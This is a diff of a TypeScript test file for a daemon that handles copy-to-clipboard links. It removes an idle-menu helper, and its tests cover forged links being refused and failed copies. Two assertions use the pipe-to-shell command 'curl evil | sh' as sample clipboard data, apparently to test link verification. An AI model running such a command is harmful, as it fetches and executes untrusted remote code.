@@ -4,7 +4,6 @@
 
 import { handleRequest, type HandledRequest } from "../src/daemon/reply";
 import type { DaemonParts } from "../src/daemon/daemon-parts";
-import { MenuIdle } from "../src/daemon/menu-idle";
 import { RuntimeStats } from "../src/daemon/stats";
 import { ProbeArrivals } from "../src/doctor/handler-probe";
 import { SessionState } from "../src/renderer/session-state";
@@ -26,12 +25,6 @@ function host(
 ) {
   const copied: string[] = [];
   const unheard: string[] = [];
-  const idle = new MenuIdle({
-    clock: systemTimekeeper,
-    now: () => instantOf(new Date()),
-    close: async () => null,
-    failed: () => {},
-  });
   const {
     arrival: _a,
     latest: _l,
@@ -53,7 +46,6 @@ function host(
   const events: string[] = [];
   const parts = {
     clock: systemTimekeeper,
-    menuIdle: idle,
     payloadProviders: {},
     frameFeeds: { latest: () => null },
     handlerProbes: new ProbeArrivals(),
@@ -71,7 +63,7 @@ function host(
     if (handled.kind !== "url") throw new Error(`answered ${handled.kind}`);
     return handled as Extract<HandledRequest, { kind: "url" }>;
   };
-  return { frame, copied, events, idle, unheard };
+  return { frame, copied, events, unheard };
 }
 
 test("a forged copy link is refused at once, saying why, and the clipboard is untouched", async () => {
@@ -88,7 +80,6 @@ test("a forged copy link is refused at once, saying why, and the clipboard is un
   expect(h.copied).toEqual([]);
   expect(h.events).toHaveLength(2);
   for (const event of h.events) expect(event).toContain("outcome=bad-request");
-  h.idle.dispose();
 });
 
 test("a link the bar drew is told verified before its click lands, and then lands", async () => {
@@ -100,7 +91,6 @@ test("a link the bar drew is told verified before its click lands, and then land
   release();
   await answered.land();
   expect(h.copied).toEqual(["curl evil | sh"]);
-  h.idle.dispose();
 });
 
 test("a version 1 frame's writer has hung up, so its verdict goes to no one", async () => {
@@ -109,7 +99,6 @@ test("a version 1 frame's writer has hung up, so its verdict goes to no one", as
   expect(answered.awaitsVerdict).toBe(false);
   await answered.land();
   expect(h.copied).toEqual(["curl evil | sh"]);
-  h.idle.dispose();
 });
 
 // A copy names no session, so no bar holds its failure: the daemon's warning
@@ -127,5 +116,4 @@ test("a click whose act failed is answered as failed, and the failure is the dae
   await answered.land();
   expect(h.events).toEqual([expect.stringContaining("outcome=threw")]);
   expect(h.unheard).toEqual([expect.stringMatching(/^copy: pbcopy failed/)]);
-  h.idle.dispose();
 });
